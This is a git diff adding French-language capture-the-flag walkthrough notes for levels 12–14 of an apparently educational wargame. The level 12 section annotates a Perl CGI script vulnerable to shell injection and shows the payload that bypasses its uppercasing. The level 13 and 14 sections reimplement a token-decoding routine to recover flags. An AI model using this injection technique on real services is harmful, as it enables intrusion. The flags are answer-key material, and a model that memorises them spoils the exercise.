@@ -457,7 +457,289 @@ cat /tmp/flag11
 
 flag: fa6v5ateaw21peobuub8ipe6s
 
+
+---------------------
 level12 
+
+cat level12.pl
+
+```pl
+#!/usr/bin/env perl            # Lance le script avec Perl
+# localhost:4646               # Indication : tourne sur le port 4646 en local
+use CGI qw{param};             # Charge le module CGI pour lire les paramètres (GET/POST)
+print "Content-type: text/html\n\n";   # En-tête HTTP pour indiquer qu'on renvoie du HTML
+
+sub t {
+  $nn = $_[1];                 # Récupère le 2ème argument (param y)
+  $xx = $_[0];                 # Récupère le 1er argument (param x)
+  $xx =~ tr/a-z/A-Z/;          # Transforme toutes les lettres minuscules en majuscules
+  $xx =~ s/\s.*//;             # Coupe tout ce qu’il y a après le premier espace
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;  # Exécute egrep dans le shell → injection possible
+  foreach $line (@output) {    # Boucle sur chaque ligne trouvée
+      ($f, $s) = split(/:/, $line);   # Coupe chaque ligne au niveau de ":" (sépare en deux parties)
+      if($s =~ $nn) {          # Si la deuxième partie ($s) contient le texte $nn
+          return 1;            # Retourne vrai (1)
+      }
+  }
+  return 0;                    # Sinon retourne faux (0)
+}
+
+sub n {
+  if($_[0] == 1) {             # Si l’argument est égal à 1
+      print("..");             # Affiche deux points
+  } else {
+      print(".");              # Sinon affiche un seul point
+  }    
+}
+
+n(t(param("x"), param("y")));  # Appelle t(x, y), puis passe le résultat à n()
+```
+
+
+
+
+
+
+Le script level12.pl prend deux paramètres (x et y) depuis une requête CGI.
+
+Il exécute egrep "^$xx" /tmp/xd, où xx = paramètre x.
+
+Comme xx est injecté tel quel dans une commande shell avec les backticks `...`, on peut faire une injection de commande.
+
+Idée : au lieu de donner une vraie regex à egrep, on injecte une commande (getflag) pour écrire le flag dans /tmp/flag12.
+
+On doit passer la commande 
+
+```bash
+$(getflag)
+```
+
+mais le programme la met en majuscule ce qui fait qu'elle ne sera pas executer 
+
+
+```bash
+cd /tmp
+vim FLAG        # script qui fait : getflag > /tmp/flag12
+chmod +x FLAG
+```
+
+```c
+curl 'localhost:4646/?x=$(/*/FLAG)'
+```
+Ici $(/*/FLAG) exécute le script placé dans /tmp/.
+
+```bash
+#!/bin/sh
+
+getflag > /tmp/flag12
+```
+
+
+```bash
+cat /tmp/flag12
+```
+
+
+flag: g1qKMiRpXf53AWhDaU7FEkczr
+
+--------------------
+
+level13
+
+```c
+if (getuid() == 0x1092)
+    return printf("your token is %s\n", ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I"));
+else
+    printf("UID %d started us but we expect %d\n", getuid(), 0x1092);
+```
+
+Cela signifie que le programme n’imprime le token que si l’UID est 0x1092 (soit 4242 en décimal = utilisateur flag13).
+
+j'ai ecris un fonction de decodage 
+
+```c
+#include <stdio.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+char * ft_des(char *param_1)
+{
+	char *param_copy;
+	uint param_len;
+	char *param_copy_2;
+	uint param_index;
+	int num_index;
+	int i;
+	int j;
+	char num_str[] = "0123456";
+	char p_char;
+
+	param_copy = strdup(param_1);
+	num_index = 0;
+	param_index = 0;
+
+	param_copy_2 = param_copy;
+	param_len = 0xffffffff;
+	/* calculate the length of parameter : strlen(param_1) */
+	do	{
+		if (param_len == 0)
+			break;
+		param_len = param_len - 1;
+		p_char = *param_copy_2;
+		param_copy_2 = param_copy_2 + 1;
+	} while(p_char);
+	do {
+		/* If param_index == len */
+		if (~param_len - 1 <= param_index)
+			return (param_copy);
+
+		if (num_index == 6)
+			num_index = 0;
+
+		/* if param_index is a XX number then it's true */
+		if ((param_index & 1) == 0)
+		{
+			if ((param_index & 1) == 0) 
+			{
+				i = 0;
+				while (i < num_str[num_index])
+				{
+					param_copy[param_index] = param_copy[param_index] + -1;
+					if (param_copy[param_index] == 0x1f)
+						param_copy[param_index] = '~';
+					i = i + 1;
+				}
+			}
+		}
+		else
+		{
+			j = 0;
+			while (j < num_str[num_index])
+			{
+				param_copy[param_index] = param_copy[param_index] + 1;
+				if (param_copy[param_index] == 0x7f) // 0x7f is the ascii code for Delete
+					param_copy[param_index] = ' ';
+				j = j + 1;
+			}
+		}
+		param_index = param_index + 1;
+		num_index = num_index + 1;
+	} while( true );
+}
+
+int main(int argc, char const *argv[])
+{
+	printf("Flag : %s\n", ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I"));
+	return 0;
+}
+```
+
+
+```bash
+gcc decode.c -o decrypt  
+./decrypt
+```
+
+flag: 2A31L79asukciNyi8uppkEuSx
+
+---------------------
+level14
+
+terminal neutre
+
+```c
+#include <stdio.h>    // pour printf
+#include <stdlib.h>   // pour malloc, free, etc.
+#include <string.h>   // pour strdup, strlen
+#include <stdint.h>   // types entiers fixes (ex: uint32_t)
+
+// Fonction qui déchiffre une chaîne codée
+char *ft_des(char *param_1)
+{
+    char cVar1;        // caractère temporaire pour les comparaisons
+    char *pcVar2;      // copie de la chaîne à modifier
+    unsigned int uVar3; // compteur utilisé pour mesurer la longueur
+    char *pcVar4;      // pointeur temporaire sur la chaîne
+    unsigned int local_20; // index de caractère courant
+    int local_1c;      // index dans la séquence "0123456"
+    int local_18;      // compteur pour boucle (cas +)
+    int local_14;      // compteur pour boucle (cas -)
+    
+    pcVar2 = strdup(param_1); // duplique la chaîne pour pouvoir la modifier
+    local_1c = 0;             // commence à 0 dans la séquence "0123456"
+    local_20 = 0;             // index au début de la chaîne
+
+    // boucle infinie
+    do {
+        uVar3 = 0xffffffff;   // initialise un compteur très grand
+        pcVar4 = pcVar2;      // pointeur au début de la chaîne
+
+        // calcule la longueur de la chaîne (similaire à strlen)
+        do {
+            if (uVar3 == 0) break;  // sécurité anti-overflow
+            uVar3 = uVar3 - 1;      // décrémente le compteur
+            cVar1 = *pcVar4;        // prend le caractère courant
+            pcVar4 = pcVar4 + 1;    // avance le pointeur
+        } while (cVar1 != '\0');    // stop quand on atteint le '\0'
+
+        // si on a atteint la fin de la chaîne → retour
+        if (~uVar3 - 1 <= local_20) {
+            return pcVar2;    // retourne la chaîne déchiffrée
+        }
+
+        // boucle sur "0123456" → recommence à 0 après 6
+        if (local_1c == 6) local_1c = 0;
+
+        // si la position est paire → on décrémente
+        if ((local_20 & 1) == 0) {
+            for (local_14 = 0; local_14 < "0123456"[local_1c]; local_14++) {
+                pcVar2[local_20]--;   // décrémente le caractère
+                if (pcVar2[local_20] == '\x1f') // si < espace
+                    pcVar2[local_20] = '~';     // boucle sur '~'
+            }
+        } 
+        // si la position est impaire → on incrémente
+        else {
+            for (local_18 = 0; local_18 < "0123456"[local_1c]; local_18++) {
+                pcVar2[local_20]++;   // incrémente le caractère
+                if (pcVar2[local_20] == '\x7f') // si dépasse '~'
+                    pcVar2[local_20] = ' ';     // boucle sur espace
+            }
+        }
+
+        local_20++; // avance à la lettre suivante
+        local_1c++; // avance dans la séquence "0123456"
+    } while(1);     // recommence jusqu’à la fin de la chaîne
+}
+
+int main()
+{
+    // appel de ft_des avec la chaîne codée (celle de UID 0xbc6)
+    char *flag = ft_des("g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|");
+
+    // affiche la chaîne déchiffrée
+    printf("Flag: %s\n", flag);
+
+    // libère la mémoire allouée par strdup
+    free(flag);
+
+    return 0; // fin normale
+}
+```
+
+```c
+gcc -std=c99 -Wall -Wextra -o test test.c
+./test
+```
+
+flag: 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+
+
+
+
 
 
 
